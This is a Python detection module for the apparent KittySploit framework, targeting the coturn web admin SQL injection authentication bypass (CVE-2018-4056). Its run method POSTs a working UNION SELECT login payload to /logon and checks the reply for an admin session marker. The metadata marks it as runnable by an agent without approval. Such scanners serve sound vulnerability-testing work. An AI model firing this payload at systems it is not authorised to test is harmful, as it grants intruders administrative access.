#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""coturn web admin SQLi authentication bypass (CVE-2018-4056)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'coturn - Web Admin Auth Bypass Detection (CVE-2018-4056)',
        'description': (
            'Detects CVE-2018-4056 by POSTing a UNION SELECT login payload to /logon and '
            'looking for Set Admin Session Realm after priming /favicon.ico.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'coturn', 'turn', 'sqli',
            'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://talosintelligence.com/vulnerability_reports/TALOS-2018-0730',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-4056',
        ],
        'cve': 'CVE-2018-4056',
    }

    def run(self):
        self.http_request(method='GET', path='/favicon.ico', allow_redirects=False)
        r = self.http_request(
            method='POST',
            path='/logon',
            data="uname=%27+union+select+%27%27%2C%270000%27%3B+--&pwd=0000",
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if "<i>' union select" in body and 'Set Admin Session Realm' in body:
            self.set_info(
                severity='critical',
                reason='coturn web admin auth bypass via SQLi (CVE-2018-4056)',
                path='/logon',
            )
            return True
        return False
